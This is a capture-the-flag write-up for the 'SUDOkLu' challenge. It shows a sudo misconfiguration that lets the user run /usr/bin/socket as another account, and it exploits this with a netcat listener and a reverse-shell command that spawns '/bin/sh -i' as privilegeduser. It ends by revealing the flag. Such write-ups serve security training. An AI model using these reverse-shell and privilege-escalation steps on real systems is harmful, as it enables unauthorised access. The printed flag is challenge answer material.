# SUDOkLu [199 solves] [50 points]

The credentials for SSH are given : `user:password123`

Our goal is to read : `/home/privilegeduser/flag.txt`

```
user@sudoklu:~$ sudo -l
Matching Defaults entries for user on sudoklu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User user may run the following commands on sudoklu:
    (privilegeduser) NOPASSWD: /usr/bin/socket
```

After logging in with SSH, we can see `user` can run `/usr/bin/socket` as `privilegeduser` with `sudo` without password

https://gtfobins.github.io/gtfobins/socket/

We can use socket to send a reverse shell back as `privilegeduser`

So just setup a listener :
```
nc -nlvp 1337
```

Then just send the reverse shell as `privilegeduser` with sudo :

```
sudo -u privilegeduser socket -qvp '/bin/sh -i' <our address> 1337
```

Then we can read the flag :
```
privilegeduser@sudoklu:/home/privilegeduser$ ls -la
total 28
drwxr-x--- 1 privilegeduser privilegeduser 4096 May 12 10:35 .
drwxr-xr-x 1 root           root           4096 May 12 10:35 ..
lrwxrwxrwx 1 root           root              9 May 12 10:35 .bash_history -> /dev/null
-rw-r--r-- 1 privilegeduser privilegeduser  220 May 12 10:35 .bash_logout
-rw-r--r-- 1 privilegeduser privilegeduser 3771 May 12 10:35 .bashrc
-rw-r--r-- 1 privilegeduser privilegeduser  807 May 12 10:35 .profile
-r-------- 1 privilegeduser privilegeduser   34 May 12 10:35 flag.txt
(remote) privilegeduser@sudoklu:/home/privilegeduser$ cat flag.txt 
Hero{ch3ck_f0r_m1sc0nf1gur4t1on5}
```